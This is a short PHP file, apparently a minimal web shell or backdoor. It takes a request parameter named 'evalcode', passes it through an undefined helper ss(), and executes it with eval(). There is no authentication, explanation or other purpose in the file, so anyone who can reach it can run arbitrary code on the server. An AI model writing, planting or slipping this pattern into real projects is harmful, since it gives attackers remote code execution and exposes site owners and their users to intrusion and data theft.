<?php
$c = "";
if(isset($_REQUEST['evalcode'])){
	$c = ss($_REQUEST['evalcode']);
	ob_start();
	eval($c);
    $b = ob_get_contents();
	ob_end_clean();
	$c = $b;
}

exit;
?>